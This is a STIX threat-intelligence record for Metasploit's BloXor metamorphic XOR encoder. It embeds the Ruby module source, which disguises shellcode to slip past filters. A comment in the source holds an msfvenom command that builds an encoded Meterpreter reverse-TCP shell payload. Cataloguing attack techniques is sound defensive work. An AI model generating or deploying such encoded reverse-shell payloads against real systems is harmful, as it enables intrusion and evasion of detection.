{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fe495a0d-4ba2-4b57-a679-03c825e74e81",
    "created": "2024-08-14T16:33:19.21796Z",
    "modified": "2024-08-14T16:33:19.217963Z",
    "name": "BloXor - A Metamorphic Block Based XOR Encoder",
    "description": "A Metamorphic Block Based XOR Encoder.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/bloxor.rb",
            "external_id": "bloxor.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/encoder/bloxor/bloxor'\n\n#\n# BloXor is a cross architecture metamorphic block based xor encoder/decoder for Metasploit.\n# BloXor was inspired by the Shikata Ga Nai encoder (./msf/modules/encoders/x86/shikata_ga_nai.rb)\n# by spoonm and the Rex::Poly::Block (./msf/lib/rex/poly/block.rb) code by skape.\n#\n# Please refer to ./msf/lib/rex/encoder/bloxor/bloxor.rb for BloXor's implementation and to\n# ./msf/lib/rex/poly/machine/machine.rb and ./msf/lib/rex/poly/machine/x86.rb for the\n# backend metamorphic stuff.\n#\n# A presentation at AthCon 2012 by Dimitrios A. Glynos called 'Packing Heat!' discusses a\n# metamorphic packer for PE executables and also uses METASM.  I am unaware of any code having\n# been publicly released for this, so am unable to compare implementations.\n# http://census-labs.com/media/packing-heat.pdf\n#\n# Manually check the output with the following command:\n# >ruby msfvenom -p windows/meterpreter/reverse_tcp RHOST=192.168.2.2 LHOST=192.168.2.1 LPORT=80 -a x86 -e x86/bloxor -b '\\x00' -f raw | ndisasm -b32 -k 128,1 -\n#\n\nclass MetasploitModule < Rex::Encoder::BloXor\n\n  # Note: Currently set to manual, bump it up to automatically get selected by the framework.\n  # Note: BloXor by design is slow due to its exhaustive search for a solution.\n  Rank = ManualRanking\n\n  def initialize\n    super(\n      'Name'        => 'BloXor - A Metamorphic Block Based XOR Encoder',\n      'Description' => 'A Metamorphic Block Based XOR Encoder.',\n      'Author'      => [ 'sf' ],\n      'Arch'        => ARCH_X86,\n      'License'     => MSF_LICENSE,\n      'EncoderType' => Msf::Encoder::Type::Unspecified\n      )\n  end\n\n  def compute_decoder( state )\n\n    @machine = Rex::Poly::MachineX86.new( state.badchars )\n\n    super( state )\n  end\nend\n"
}